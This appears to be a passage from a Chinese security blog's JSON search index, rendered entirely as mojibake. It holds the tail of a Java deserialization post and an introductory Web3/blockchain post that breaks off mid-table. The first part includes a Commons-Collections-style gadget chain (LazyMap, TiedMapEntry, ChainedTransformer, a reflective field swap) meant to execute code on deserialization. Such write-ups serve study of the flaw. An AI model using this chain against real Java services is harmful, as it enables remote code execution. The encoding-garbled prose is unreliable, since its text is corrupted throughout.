é˜²æ­¢åœ¨putæ—¶å°±å¼¹è®¡ç®—å™¨ï¼Œæˆ‘è¿™é‡Œæ˜¯åœ¨decorateæ—¶ï¼Œä¼ ä¸€ä¸ªæ— æ•ˆçš„Transformerï¼Œputæ—¶å°±ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œåœ¨åºåˆ—åŒ–å‰å°†factoré€šè¿‡åå°„ä¿®æ”¹å›å»ï¼Œååºåˆ—åŒ–çš„ç»“æœå°±ä¸ä¼šå—åˆ°å½±å“ï¼š\n\n```java\n        ChainedTransformer ctf = getChain.getChainedTransformer();\n        HashMap<Object,Object> map = new HashMap<>();\n        Map<Object,Object> lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));\n\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\n        HashMap<Object,Object> hashMap = new HashMap<>();\n        hashMap.put(tiedMapEntry,\"123\");\n        lazyMap.remove(\"123\");\n\n        Class c = LazyMap.class;\n        Field factoryField = c.getDeclaredField(\"factory\");\n        factoryField.setAccessible(true);\n        factoryField.set(lazyMap,ctf);\n//      serialize(hashMap);\n\t\t\t\tunserialize(\"ser.bin\");\n```\n","tags":["Javaååºåˆ—åŒ–"],"categories":["WebSec"]},{"title":"åŒºå—é“¾å®‰å…¨å‰ç½®æ‰«ç›²","url":"/2023/04/24/åŒºå—é“¾å®‰å…¨å‰ç½®æ‰«ç›²/","content":"\n# web3.0å®‰é—»å…¨çŸ¥\n\n> å‚è€ƒé“¾æ¥\n> \n\n[å»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åº Dapp æ˜¯ä»€ä¹ˆï¼Ÿä¸ APP æœ‰å“ªäº›åŒºåˆ«ï¼Ÿ](https://www.playbtc.cn/rumen/52380.html)\n\n[https://www.youtube.com/watch?v=YdWP-wJh9jA](https://www.youtube.com/watch?v=YdWP-wJh9jA)\n\n## äº’è”ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µ\n\n### web1.0\n\né™æ€é¡µé¢ï¼Œå†…å®¹åªèƒ½ä¾›ç”¨æˆ·å»é˜…è¯»ï¼Œç±»ä¼¼äºåœ¨ç½‘ç»œä¸Šè¯»æŠ¥çº¸æˆ–è€…çœ‹ä¹¦ã€‚\n\n### web2.0\n\nåŠ¨æ€äº’è”ç½‘ï¼Œå®ç°ç”¨æˆ·ä¹‹é—´çš„äº’åŠ¨ï¼Œæ¯”å¦‚twitterï¼Œfacebookï¼Œtitokç­‰ã€‚\n\nweb2.0ä¸­å‚å•†ç”¨å…è´¹æˆ–æä½çš„æˆæœ¬å¸å¼•ç”¨æˆ·ï¼Œé€šè¿‡è·å–åˆ°ç”¨æˆ·çš„ä¿¡æ¯æ¥æ¨æµå¹¿å‘Šä»è€Œè·å¾—åˆ©æ¶¦ã€‚\n\næ‰“ä¸ªæ¯”æ–¹å°±æ˜¯ å‚å•†åœ¨ä¸€ç‰‡åœ°ä¸Šç§äº†å¾ˆå¤šè‰ï¼Œå¸å¼•ç¾Šæ¥åƒï¼Œè¶ç€ç¾Šåƒè‰çš„åŠŸå¤«æŠŠç¾Šèº«ä¸Šçš„æ¯›è–…ä¸‹æ¥æ‹¿å»å–é’±ï¼Œè€Œç¾Šè‡ªå·±å¹¶ä¸åœ¨æ„è¿™äº›æ¯›ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ç§åŒå‘äº’åˆ©çš„æ–¹å¼ã€‚\n\n### web3.0\n\nweb3.0æ˜¯ä¸€ä¸ªå¾ˆæ¨¡ç³Šçš„æ¦‚å¿µï¼Œéšç€åŒºå—é“¾æŠ€æœ¯çš„å‘å±•ï¼ŒåŸºäºåŒºå—é“¾çš„web3.0è¯ç”Ÿã€‚\n\næ¥ç€ç”¨ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œéšç€web2.0çš„å‘å±•å£®å¤§ï¼Œç¨€ç¼ºçš„ä¸å†æ˜¯è‰ï¼Œè€Œæ˜¯ç¾Šæ¯›ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·èº«ä¸Šçš„æ•°æ®ã€‚é‚£ä¹ˆç¾Šæ¯›çš„é‡è¦æ€§æ„ˆåŠ çªå‡ºï¼Œæ‰€ä»¥æå‡ºweb3.0çš„æ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯æ‹¥æœ‰è‡ªå·±çš„ä¸€ç‰‡ç©ºé—´ï¼Œåˆ«äººæ— è®ºå¦‚ä½•éƒ½æ— æ³•ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯å°†ç¾Šæ¯›ï¼ˆæ•°æ®ï¼‰å­˜æ”¾åœ¨äº†ä¸€ä¸ªéå¸¸å®‰å…¨çš„åœ°æ–¹ä¸­ï¼Œç›¸æ¯”äºweb2.0ï¼Œä¸ä½†å®ç°äº†åŠ¨æ€çš„äº¤äº’ï¼Œä¹Ÿå®ç°äº†æ•°æ®çš„â€œæ‹¥æœ‰â€ã€‚\n\nweb3çš„æ¦‚å¿µéå¸¸æ¨¡ç³Šï¼Œå¯ä»¥è¯´æ˜¯ä¸€ä¸ªå¤§æ–¹å‘ï¼ŒæŒ‰ç…§æˆ‘ä¸ªäººçš„ç†è§£å¯ä»¥è¯´æ˜¯åœ¨äº’è”ç½‘åˆ›é€ äº†ä¸€ä¸ªè™šæ‹Ÿçš„ä¸–ç•Œï¼Œè¿™ä¸ªè™šæ‹Ÿçš„ä¸–ç•Œæ‹¥æœ‰å’Œç°å®ä¸–ç•Œä¸€æ ·çš„è´§å¸äº¤æ˜“ç³»ç»Ÿä»¥åŠå…¶ä»–ä½“ç³»ï¼Œèƒ½å¤Ÿè‡ªä¸»ç»´æŒè¿è½¬çš„è¿™æ ·ä¸€ä¸ªâ€œè™šæ‹Ÿç”Ÿæ€ç³»ç»Ÿâ€ï¼Œè€Œè¿™ä¸ªç”Ÿæ€ç³»ç»Ÿçš„ç”Ÿå­˜æ³•åˆ™å°±æ˜¯â€œå»ä¸­å¿ƒåŒ–â€ã€‚\n\n**ä»€ä¹ˆæ˜¯å»ä¸­å¿ƒåŒ–ï¼Ÿ**\n\næ¯”å¦‚ç°åœ¨å¸‚é¢ä¸Šçš„appéƒ½ç”±ä¸€ä¸ªå‚å®¶è´Ÿè´£ï¼Œå‚å•†å¯ä»¥éšæ„åˆ é™¤æ§åˆ¶ç”¨æˆ·æ•°æ®ï¼Œå½¢æˆäº†ä»¥å‚å•†ä¸ºä¸­å¿ƒçš„æœåŠ¡ä½“ç³»ï¼Œå»ä¸­å¿ƒåŒ–å°±æ˜¯æ²¡æœ‰ä¸­å¿ƒå‚å•†ä½œä¸ºæ ¸å¿ƒï¼Œè€Œæ˜¯æ‰€æœ‰ç”¨æˆ·å½¢æˆä¸€ä¸ªèƒ½å¤Ÿè‡ªåŠ›æ›´ç”Ÿçš„ä½“ç³»ã€‚\n\n## å¯†ç è´§å¸\n\néšç€web2.0å‘å±•ï¼Œæ•°å­—è´§å¸ä½¿ç”¨è¶Šæ¥è¶Šå¤šï¼Œè€Œåœ¨åŒºå—é“¾æŠ€æœ¯çš„æ”¯æŒä¸‹ï¼Œæ•°å­—è´§å¸ä¹Ÿå‡ºç°äº†å…¨æ–°çš„å­˜åœ¨å½¢å¼ï¼Œå»ä¸­å¿ƒåŒ–çš„å¯†ç è´§å¸ï¼Œä¸–ç•Œä¸Šç¬¬ä¸€ç§å¯†ç è´§å¸å°±æ˜¯æ¯”ç‰¹å¸ã€‚åƒçº¸å¸æœ‰é˜²ä¼ªå°ä¸€æ ·ï¼Œå¯†ç è´§å¸é€šè¿‡å¯†ç å­¦çš„æ•£åˆ—è®¡ç®—å‡ºçš„hashå€¼å¹¶ä¸”å’Œæ™ºèƒ½åˆçº¦è¿›è¡Œç»‘å®šï¼Œå¯†ç è´§å¸åŸºäºå»ä¸­å¿ƒåŒ–çš„æœºåˆ¶ï¼Œä¸ä¾èµ–ä¸­å¿ƒç›‘ç®¡ä½“ç³»çš„é“¶è¡Œé‡‘èç³»ç»Ÿç›¸å¯¹ã€‚ä¹‹åå‡ºç°çš„æ•°ç§å¯†ç è´§å¸è¢«åˆ›é€ ï¼Œå®ƒä»¬é€šå¸¸è¢«ç§°ä¸ºaltcoinsã€‚\n\n## åŒºå—é“¾\n\n[ç¨‹åºå‘˜æ¥è®²è®²ä»€ä¹ˆæ˜¯åŒºå—é“¾ | å°ç™½ä¹Ÿèƒ½å¬æ‡‚çš„é€šä¿—è§£é‡Š | åŒºå—é“¾åŸç† | æ¯”ç‰¹å¸ | æ•°å­—è´§å¸_å“”å“©å“”å“©_bilibili](https://www.bilibili.com/video/BV14E411v7eS/?spm_id_from=333.337.search-card.all.click)\n\n**åŒºå—é“¾çš„é˜²ç¯¡æ”¹æœºåˆ¶**\nä¸€ä¸ªåŒºå—ä¸­å‚¨å­˜äº†ä¸‰æ ·ä¸œè¥¿ï¼šæ•°æ®ï¼Œå‰ä¸€ä¸ªåŒºå—çš„hashå€¼ï¼Œè‡ªèº«çš„hashå€¼ï¼ˆç”±æ•°æ®å’Œå‰ä¸€åŒºå—çš„å“ˆå¸Œå€¼å…±åŒå†³å®šï¼‰ï¼Œå¦‚æœè¦æ›´æ”¹æŸä¸€åŒºå—çš„å†…å®¹ï¼Œé‚£ä¹ˆè¯¥åŒºå—ï¼ˆaåŒºå—ï¼‰çš„hashå€¼å°±ä¼šæ”¹å˜ï¼Œä¸‹ä¸€åŒºå—ï¼ˆbåŒºå—ï¼‰å‚¨å­˜çš„aåŒºå—çš„hashå€¼æ— æ³•å¯¹åº”aåŒºå—å½“å‰å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªåŒºå—é—´çš„é“¾æ¥å°±ä¼šæ–­å¼€ã€‚\n\nå¦‚æœæƒ³è¦ç¯¡æ”¹æŸä¸€åŒºå—çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±è¦å°†è¿™ä¸€åŒºå—ä»¥åŠåç»­æ‰€æœ‰åŒºå—çš„hashå€¼è¿›è¡Œé‡ç®—ï¼Œæ¯”å¦‚ä¸€æ¡åŒºå—é“¾é‡Œé¢æœ‰abcdeäº”ä¸ªåŒºå—ï¼Œå½“æˆ‘ä»¬ç¯¡æ”¹äº†båŒºå—çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å¸¦ç€båŒºå—çš„æ–°hashå€¼å’ŒcåŒºå—çš„æ•°æ®é‡æ–°è®¡ç®—å‡ºcåŒºå—çš„æ–°hashå€¼ï¼Œç„¶åå†å¸¦ç€cåŒºå—çš„æ–°hashå€¼å’ŒdåŒºå—çš„æ•°æ®é‡æ–°è®¡ç®—dåŒºå—çš„æ–°hashå€¼ï¼Œå†å¸¦ç€dåŒºå—çš„æ–°hashå€¼å’ŒeåŒºå—çš„æ•°æ®é‡æ–°è®¡ç®—eåŒºå—çš„hashå€¼â€¦â€¦â€¦â€¦â€¦â€¦â€¦..å…¶å®åœ¨é‡æ–°è®¡ç®—æŸä¸€åŒºå—çš„hashå€¼çš„è¿‡ç¨‹ä¹Ÿå°±ç›¸å½“äºåˆ›é€ äº†ä¸€ä¸ªæ–°çš„åŒºå—ï¼Œå› æ­¤ç¯¡æ”¹ä¸€ä¸ªåŒºå—ä»¥åŠåç»­åŒºå—æ‰€éœ€çš„æ—¶é—´å–å†³äºåˆ›é€ ä¸€ä¸ªåŒºå—æ‰€éœ€è¦çš„æ—¶é—´ã€‚\n\nè¿™ä¸ªçœ‹èµ·æ¥å¯¹ç®—åŠ›è¦æ±‚ä¼¼ä¹éå¸¸åºå¤§ï¼Œä½†æ˜¯ç°ä»£è®¡ç®—æœºå…¶å®æ˜¯å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹çš„ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€å°è¶…å¤§ç®—åŠ›çš„è®¡ç®—æœºï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯è½»æ¾å°±å¯ä»¥æ”¹å˜åŒºå—é“¾çš„å†…å®¹äº†ï¼Ÿä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µçš„å‡ºç°ï¼ŒåŒºå—é“¾åŠ å…¥äº†å·¥ä½œé‡è¯æ˜æœºåˆ¶ï¼ˆproof of workï¼‰ç®€ç§° pow\n\næˆ‘ä»¬ç”¨æ¸¸æˆä¸¾ä¾‹è¯´æ˜ä¸€ä¸‹powï¼Œæˆ‘ä»¬åˆšæ‰è¯´åˆ°ç”¨è¶…å¤§ç®—åŠ›è®¡ç®—æœºæ¥ç¯¡æ”¹åŒºå—é“¾ï¼Œè¿™å°±å¥½æ¯”ä½ æ‹¿ç€æ»¡çº§ç¥è£…åœ¨æ–°æ‰‹æ‘ä¹±æ€ï¼ŒåŒºå—é“¾æ˜¯ä¸å…è®¸è¿™ç§æƒ…å†µå‡ºç°çš„ï¼Œå› æ­¤å®ƒä¼šä¸Šè°ƒæ€ªç‰©å±æ€§ï¼Œä¹Ÿå°±æ˜¯ä¼šå¢åŠ åˆ›é€ ä¸€ä¸ªåŒºå—æ‰€éœ€çš„éš¾åº¦ï¼Œä½¿æ¯ä¸€æ–°åŒºå—è¢«åˆ›é€ æ—¶éƒ½ä¿æŒåœ¨ååˆ†é’Ÿå·¦å³ï¼ˆå½“ç„¶è¿™ä¸ªæ—¶é—´æ˜¯å¯ä»¥æ›´æ”¹çš„ï¼‰ï¼Œå› æ­¤å³ä½¿æ˜¯ä¸€å°è¶…é«˜ç®—åŠ›çš„è®¡ç®—æœºæƒ³è¦ç¯¡æ”¹ä¸€ä¸ªåŒºå—æ‰€éœ€çš„æ—¶é—´ä»ç„¶æ˜¯æ˜¯ \n\n`åˆ›é€ ä¸€ä¸ªåŒºå—çš„æ—¶é—´âœ–ï¸n min`ã€‚\n\né‚£æˆ‘ä»¬æ‰€è¯´çš„æŒ–çŸ¿æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸Šé¢æåˆ°çš„æƒ…å†µæ˜¯æƒ³è¦ç¯¡æ”¹åŒºå—ä¸­çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘æ²¡æœ‰æ¶æ„ï¼Œæˆ‘åªæ˜¯å•çº¯çš„åˆ›é€ åŒºå—å»ç»™è‡ªå·±æˆ–è€…ä»–äººä½¿ç”¨ï¼Œè¿™ä¸ªåˆ›é€ åŒºå—çš„è¿‡ç¨‹ç‰ºç‰²äº†æˆ‘ç”µè„‘çš„ç®—åŠ›å’Œä¸€äº›å…¶ä»–èµ„æºï¼Œæ‰€ä»¥ä½œä¸ºè¡¥å¿ï¼Œåˆ›å»ºåŒºå—çš„äººä¼šå¾—åˆ°å¯†ç è´§å¸çš„å¥–åŠ±ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„æŒ–çŸ¿ã€‚\n\n**åŒºå—é“¾çš„ç‚¹å¯¹ç‚¹ç½‘ç»œç»“æ„**\n\nåœ¨ä¼ ç»Ÿçš„webæœåŠ¡ä¸­ï¼Œä¼ ç»Ÿçš„é“¾æ¥å¯¹è±¡åŸºæœ¬éƒ½æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œä¼—å¤šå®¢æˆ·ç«¯è®¿é—®ä¸€ä¸ªæœåŠ¡ç«¯æ¥è¿›è¡Œäº¤äº’ï¼Œè€Œåœ¨åŒºå—é“¾çš„ç‚¹å¯¹ç‚¹ç½‘ç»œç»“æ„ï¼ˆpeer to peerï¼‰ä¸­ï¼Œä¸å†æœ‰å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„æ¦‚å¿µï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹é—´ç›¸äº’å¹³ç­‰ï¼Œå¹¶ä¸”åŒ…å«å®Œæ•´çš„åŒºå—é“¾æ•°æ®å­˜å‚¨ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸­éƒ½å‚¨å­˜äº†æ•´ä¸ªåŒºå—é“¾ç½‘ç»œä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™æ ·å³ä½¿ä¸€ä¸ªèŠ‚ç‚¹å‡ºç°æ•…éšœï¼Œå…¶ä»–æ‰€æœ‰èŠ‚ç‚¹ä¹Ÿåœ¨å¸®ä»–è®°å½•ä¿¡æ¯ï¼Œè¿™äº›è®°å½•äº†æ‰€æœ‰èŠ‚ç‚¹åŒºå—é“¾çš„èŠ‚ç‚¹å«åšå…¨èŠ‚ç‚¹ï¼Œå½“ç„¶ä¹Ÿæœ‰åªå‚¨å­˜äº†è‡ªå·±ä¿¡æ¯çš„è½»èŠ‚ç‚¹ï¼Œæ¯”å¦‚åŒºå—é“¾ç”¨æ¥å‚¨å­˜è½¬è´¦è®°å½•ï¼Œé‚£ä¹ˆæ¯ä¸€èŠ‚ç‚¹éƒ½å‚¨å­˜äº†æ‰€æœ‰èŠ‚ç‚¹ä¹‹é—´çš„è½¬è´¦è®°å½•ï¼Œæ¯ä¸€èŠ‚ç‚¹å‚¨å­˜çš„å†…å®¹ä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œå¦‚æœæŸä¸€èŠ‚ç‚¹ä¸å…¶ä»–èŠ‚ç‚¹å‡ºç°å·®å¼‚ï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹æˆ–è®¸å°±æœ‰è¢«ç¯¡æ”¹è¿‡çš„å¯èƒ½äº†ï¼Œä½†æ˜¯è¢«ç¯¡æ”¹å‡ ä¹æ˜¯ä¸å¯èƒ½å‘ç”Ÿçš„ï¼ŒåŸå› çœ‹ä¸‹é¢ã€‚\n\nç‚¹å¯¹ç‚¹ç½‘ç»œç»“æ„ä¸‹çš„æ‰€æœ‰èŠ‚ç‚¹æ‹¥æœ‰åˆ¤æ–­åŒºå—æ˜¯å¦è¢«ç¯¡æ”¹çš„èƒ½åŠ›ï¼Œå½“ä¸€ä¸ªæ–°åŒºå—æƒ³è¦åŠ å…¥æŸä¸€èŠ‚ç‚¹çš„åŒºå—é“¾æ—¶ï¼Œè¯¥èŠ‚ç‚¹ä¼šå‘å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹è¿›è¡Œå¹¿æ’­ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœ50%ä»¥ä¸Šçš„èŠ‚ç‚¹éƒ½è®¤ä¸ºè¯¥åŒºå—æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œé‚£ä¹ˆè¿™ä¸ªåŒºå—å°±å¯ä»¥æˆåŠŸçš„åŠ å…¥åŒºå—é“¾å½“ä¸­ï¼Œåè¨€ä¹‹å¦‚æœæƒ³è¦ç¯¡æ”¹æŸä¸€åŒºå—çš„æ•°æ®ï¼Œä½ é¦–å…ˆè¦å°†è¿™ä¸€åŒºå—åçš„æ‰€æœ‰å“ˆå¸Œé‡æ–°è®¡ç®—ï¼Œå¹¶ä¸”è¿˜è¦æ›´æ”¹è¶…è¿‡ç™¾åˆ†ä¹‹äº”åèŠ‚ç‚¹çš„è¿™ä¸€åŒºå—åçš„æ‰€æœ‰åŒºå—çš„å“ˆå¸Œï¼Œé‚£ä¹ˆå°±è¦æ‹¥æœ‰è¶…è¿‡å…¨ç½‘50%ä»¥ä¸Šçš„ç®—åŠ›æ‰å¯ä»¥ï¼Œè¿™ä»˜å‡ºçš„ä»£ä»·æ˜¯ç›¸å½“é«˜çš„ï¼Œè¿™å°±æ˜¯åŒºå—é“¾ç½‘ç»œç³»ç»Ÿçš„å°‘æ•°æœä»å¤šæ•°åŸåˆ™ã€‚\n\n## DAPP\n\n### **Dapp æ˜¯ä»€ä¹ˆï¼Ÿ**\n\nAPP (Application) æŒ‡çš„æ˜¯æ‰‹æœºé‡Œçš„åº”ç”¨ç¨‹åºï¼Œåƒæ˜¯å¾®ä¿¡ã€å¾®åšã€æŠ–éŸ³â€¦ç­‰éƒ½æ˜¯æ—¥å¸¸ç”Ÿæ´»ä¸­å¸¸ä¼šä½¿ç”¨åˆ°çš„ Appã€‚\n\nè€Œ Dapp çš„å…¨åä¸ºå»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åºï¼ˆDecentralized Applicationï¼‰ï¼Œæ˜¯å»ºç«‹åœ¨åŒºå—é“¾ç³»ç»Ÿç½‘ç»œä¸Šï¼Œæ‰€æä¾›çš„æœåŠ¡éƒ½å…·æœ‰å…¬å¼€é€æ˜ã€ä¸å¯ç¯¡æ”¹çš„ç‰¹æ€§ã€‚\n\nä»¥ä¸‹æ˜¯ Dapp æ‰€å…·æœ‰çš„è¦ç´ ï¼š\n\n- ä»£ç å¼€æºï¼šç¨‹åºä»£ç çš†å…¬å¼€é€æ˜ï¼Œä»»ä½•äººéƒ½å¯ä»¥æŸ¥é˜…åŠå®¡æ ¸ï¼Œé¿å…é¡¹ç›®æ–¹è¯´åˆ°æ²¡åšåˆ°ã€‚\n- åˆ†å¸ƒå¼å¸æœ¬ï¼šé™ä½æ•°æ®é—å¤±çš„é£é™©ï¼Œä¸”æ²¡æœ‰ä»»ä½•å…¶ä»–ç¬¬ä¸‰æ–¹æœ‰æƒèƒ½å¤Ÿçªœæ”¹æ•°æ®ã€‚\n- æ•°æ®æ‰€æœ‰æƒï¼šé™¤æœ¬äººï¼ˆç§é’¥æŒæœ‰è€…ï¼‰å¤–ï¼Œä»»ä½•äººçš†æ— æ³•åŠ¨ç”¨è¯¥å¸å·çš„æ•°æ®ã€‚\n\n### **ä¸ºä»€ä¹ˆ Dapp ä¼šå´›èµ·?**\n\näº‹å®ä¸Šï¼ŒApp éƒ½æ˜¯ä¸­å¿ƒåŒ–çš„åº”ç”¨æœåŠ¡ï¼Œç”¨æˆ·æ‰€ä½¿ç”¨çš„æ•°æ®éƒ½ä¼šå­˜å‚¨åœ¨å•ä¸€æœåŠ¡å™¨ç³»ç»Ÿé‡Œï¼Œä»£è¡¨å…¬å¸èƒ½æŒæ§ç”¨æˆ·çš„æ‰€æœ‰æ•°æ®ï¼Œä½†ç›¸å…³é—®é¢˜ä¹Ÿéšä¹‹æµ®å‡ºæ°´é¢ã€‚\n\n### **æ•°æ®æ‰€æœ‰æƒå½’å±é—®é¢˜**\n\nç”¨æˆ·åœ¨ App ä¸Šçš„ä¸ªäººèµ„æ–™ã€æœç´¢æµè§ˆçºªå½•ç­‰ä¿¡æ¯éƒ½ä¼šå­˜å‚¨åœ¨ä¸­å¿ƒåŒ–ç³»ç»Ÿçš„æœåŠ¡å™¨é‡Œï¼Œè¿™ä¹Ÿæ„å‘³ç€è½¯ä»¶å…¬å¸èƒ½å¤Ÿå€Ÿç”±è¿™äº›æ•°æ®æ¥è¥åˆ©ã€‚\n\nä¹Ÿå¯¼è‡´åƒæ˜¯å¾®åšã€æŠ–éŸ³ç­‰ä¼ä¸šï¼Œèƒ½é€è¿‡æœé›†çš„ç”¨æˆ·æ•°æ®æ¥æŠ•æ”¾å¹¿å‘Šï¼Œå¹¶å€Ÿæ­¤è·åˆ©ã€‚ç­‰äºä¼ä¸šèƒ½ç”¨ä½ çš„ä¿¡æ¯æ¥èµšé’±ï¼Œä½†ä½ å´åˆ†ä¸åˆ°ä»»ä½•å¥½å¤„ï¼Œç”šè‡³è¿˜å¯èƒ½å—åˆ°å½±å“ï¼ˆä¾‹å¦‚è¢«ç–¯ç‹‚æŠ•æ”¾å¹¿å‘Šã€æˆ–ä¸ªäººèµ„æ–™è¢«å¹³å°å¤–æ³„ï¼‰ã€‚\n\nå¦å¤–ï¼Œä¼ ç»Ÿæ‰‹æ¸¸çš„æ¸¸æˆé“å…·ã€å¸å·æ•°æ®ä¹Ÿéƒ½å±äºå…¬å¸æ‰€æœ‰ï¼Œä¸€æ—¦å®£å¸ƒåœæ­¢è¥è¿ï¼Œè¿™äº›èµ„äº§ä¹Ÿä¼šéšç€å®˜æ–¹æœåŠ¡å™¨å…³é—­è€Œæ¶ˆå¤±ã€‚\n\nä½†åœ¨ Dapp ä¸­ï¼Œä½ çš„æ¸¸æˆé“å…·ã€å¸å·éƒ½ä¼šä»¥ NFT å½¢å¼å‚¨å­˜åœ¨é“¾ä¸Šï¼Œå› æ­¤åªè¦åŒºå—é“¾ä¸å€’ï¼Œä½ å°±èƒ½æŒç»­æ‹¥æœ‰è¿™äº›èµ„äº§ã€‚æ¢å¥è¯è¯´ï¼ŒDapp èƒ½å¤Ÿè®©æ•°æ®çš„æ‰€æœ‰æƒå›å½’åˆ°ç”¨æˆ·èº«ä¸Šã€‚é¢å¤–æé†’ï¼Œè™½ç„¶ä½ ä»æ‹¥æœ‰è¿™äº›èµ„äº§ï¼Œä½†å¯èƒ½ä¼šå› ä¸ºæ¸¸æˆå·²ç»å…³é—­ï¼Œå¯¼è‡´è¿™äº›èµ„äº§çš„ç°å€¼è¶‹è¿‘äºé›¶ï¼Œä½ èƒ½ä¿æœ‰çš„ä»ä»¥å›å¿†å±…å¤šã€‚\n\n### **è¿‡åº¦ä¸­å¿ƒåŒ–**\n\nApp æ˜¯ç”±ä¸­å¿ƒåŒ–æœåŠ¡å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå› æ­¤ä¼ä¸šæœ‰æ—¶å¯ä»¥ä¸“æ–­ç‹¬è¡Œï¼Œä½†ç”¨æˆ·å´æ²¡æœ‰ä»»ä½•ååˆ¶çš„æ‰‹æ®µï¼šä¾‹å¦‚å¯ä»¥éšæ„æ¤å…¥å¹¿å‘Šï¼Œæˆ–æ˜¯åˆ é™¤ç”¨æˆ·çš„å†…å®¹ã€å¸å·ã€‚\n\nè€Œ Dapp çš„æ•°æ®éƒ½å­˜åœ¨åŒºå—é“¾ä¸Šï¼Œå› æ­¤é¡¹ç›®æ–¹æ²¡åŠæ³•ä»»æ„åˆ é™¤ç”¨æˆ·èµ„æ–™ï¼Œç›®å‰ä¹Ÿæ²¡æœ‰ä»»ä½•å¹¿å‘Šæ¤å…¥çš„é—®é¢˜ï¼ˆä½†ä¸ç¡®å®šæœªæ¥æ˜¯å¦ä¼šæœ‰é¡¹ç›®å¼€å§‹æ¤å…¥å¹¿å‘Šï¼‰ã€‚\n\nç”±äºä¸Šè¿°å‡ ç‚¹åŸå› ï¼Œä¹Ÿè®©è®¸å¤šäººå¼€å§‹å¯¹ä¼ ç»Ÿçš„ App æ„Ÿåˆ°ä¸æ»¡ï¼Œäºæ˜¯å°±æœ‰äººæ‰“ç®—é€šè¿‡åŒºå—é“¾â€œå»ä¸­å¿ƒåŒ–â€çš„ç‰¹æ€§æ¥ç ”å‘èƒ½è§£å†³ä¸Šè¿°é—®é¢˜çš„ Appï¼Œäºæ˜¯ Dapp å°±æ­¤è¯ç”Ÿã€‚\n\nä¸è¿‡åŒæ—¶ä¹Ÿè¦æ³¨æ„ï¼Œä¸æ˜¯æ¯ä¸ª Dapp éƒ½ä¸€å®šç¬¦åˆå…¬å¼€ã€å»ä¸­å¿ƒåŒ–çš„è§„èŒƒï¼Œä¾‹å¦‚ Opensea å°±èƒ½ä¸‹æ¶ç”¨æˆ·çš„ NFT å’Œé™åˆ¶ç”¨æˆ·ç™»é™†ã€‚\n\n### **Dapp ä¸ App çš„å·®å¼‚**\n\nApp çš„åº”ç”¨æœåŠ¡æ˜¯ä½¿ç”¨ä¸­å¿ƒåŒ–æœåŠ¡å™¨ï¼Œä»£è¡¨è½¯ä»¶å…¬å¸å¿…é¡»è¦æ‰¿æ‹…å­˜å‚¨ç”¨æˆ·çš„æ•°æ®é‡çš„è¥è¿æˆæœ¬ï¼Œå¦åˆ™å°†æ— æ³•æŒç»­åœ°è¿è¡Œã€‚\n\nä¾‹å¦‚æŠ–éŸ³æœåŠ¡å™¨çš„æˆæœ¬å°±ç™¾ä¸‡ä»¥ä¸Šï¼Œå› æ­¤å¿…é¡»æƒ³åŠæ³•åˆ›é€ å„ç§è¥æ”¶ç®¡é“æ¥æ”¯æŒå„é¡¹æ”¯å‡ºï¼Œåƒæ˜¯é€šè¿‡å¤§æ•°æ®å°†å¹¿å‘Šæ¨å¹¿åˆ°æ½œåœ¨ç”¨æˆ·é¢å‰ï¼Œå€Ÿæ­¤å¸å¼•æ›´å¤šå¹¿å‘Šå•†è¿›é©»ã€‚\n\nè€Œ Dapp æ˜¯å»ºç«‹åœ¨åŒºå—é“¾ä¸Šï¼Œç”¨æˆ·åœ¨é“¾ä¸Šè¿›è¡Œäº¤æ˜“ã€æ¢å¸ç­‰è¡Œä¸ºæ—¶ï¼Œæ˜¯éœ€è¦è‡ªè¡Œè´Ÿæ‹…æ‰‹ç»­è´¹ï¼ˆGas è´¹ï¼‰çš„ï¼Œä¹Ÿå°±ä»£è¡¨å¼€å‘å•†çš„è¿è¥æˆæœ¬ä¼šæ¯”ä¼ ç»Ÿ App æ¥å¾—æ›´ä½ï¼ˆä¸è¿‡æœ‰äº›å¼€å‘å•†ä¸ºäº†å¸å¼•ç”¨æˆ·ï¼Œä¼šå¸®ç”¨æˆ·è´Ÿæ‹…ä½¿ç”¨æ—¶çš„æ‰‹ç»­è´¹ï¼‰ã€‚\n\n|  | Dapp | App |\n| --- | --- | --- |\n| æœåŠ¡å™¨ | å»ä¸­å¿ƒåŒ– | ä¸­å¿ƒåŒ– |\n| éšç§æ€§ | æœ‰ï¼ˆåŒºå—é“¾åŒ¿åæ€§ï¼‰ | æ— ï¼ˆè¿˜å¯èƒ½è¢«å¤–æ³„ï¼‰ |\n| è¥è¿æˆæœ¬ | ç”¨æˆ·å…±åŒè´Ÿæ‹…ï¼ˆæˆ–å¼€å‘å•†è´Ÿæ‹…ï¼‰ | å¼€å‘å•†è´Ÿæ‹… |\n| 